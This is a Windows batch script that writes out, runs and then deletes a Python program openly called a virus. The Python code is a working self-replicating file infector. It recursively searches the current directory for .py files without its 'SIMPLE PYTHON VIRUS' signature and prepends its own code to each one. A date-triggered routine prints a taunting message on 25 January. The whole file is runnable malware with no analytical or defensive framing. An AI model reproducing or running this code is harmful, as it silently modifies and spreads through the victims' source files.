@echo off
setlocal enabledelayedexpansion

REM Create a temporary Python script
set "script=virus_script.py"

(
echo #!/usr/bin/python
echo import os
echo import datetime
echo
echo SIGNATURE = "SIMPLE PYTHON VIRUS"
echo
echo # Function to search for Python files that are not infected
echo def search(path):
echo     filestoinfect = []
echo     filelist = os.listdir(path)
echo     for fname in filelist:
echo         full_path = os.path.join(path, fname)
echo         if os.path.isdir(full_path):
echo             filestoinfect.extend(search(full_path))
echo         elif fname.endswith(".py"):
echo             infected = False
echo             with open(full_path, 'r') as file:
echo                 for line in file:
echo                     if SIGNATURE in line:
echo                         infected = True
echo                         break
echo             if not infected:
echo                 filestoinfect.append(full_path)
echo     return filestoinfect
echo
echo # Function to "infect" files (simply appends a message here)
echo def infect(filestoinfect):
echo     # Read the contents of this script (acting as the "virus")
echo     with open(os.path.abspath(__file__), 'r') as virus:
echo         virusstring = ""
echo         for i, line in enumerate(virus):
echo             if i >= 0 and i < 39:  # Only taking the first 39 lines
echo                 virusstring += line
echo
echo     # "Infect" each target file by adding virusstring at the beginning
echo     for fname in filestoinfect:
echo         with open(fname, 'r') as f:
echo             temp = f.read()
echo         with open(fname, 'w') as f:
echo             f.write(virusstring + temp)
echo
echo # Payload function to execute on a specific date
echo def bomb():
echo     if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
echo         print("HAHA YOU ARE AFFECTED BY VIRUS!! AND THAT'S AN EVIL LAUGH BY THE WAY!!")
echo
echo # Main execution flow
echo filestoinfect = search(os.path.abspath(""))
echo infect(filestoinfect)
echo bomb()
) > %script%

REM Execute the temporary Python script
python %script%

REM Optional: Clean up the temporary Python script after execution
del %script%

endlocal
